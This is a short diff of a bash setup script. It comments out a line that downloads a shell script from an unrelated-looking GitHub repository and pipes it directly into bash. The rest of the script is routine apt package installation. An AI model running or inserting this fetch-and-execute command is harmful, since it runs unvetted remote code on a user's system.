@@ -1,5 +1,5 @@
 #!/bin/bash
-curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/avian_service.sh|bash
+# curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/avian_service.sh|bash
 # Step 1: Install necessary dependencies
 apt update -y
 apt install curl wget git -y
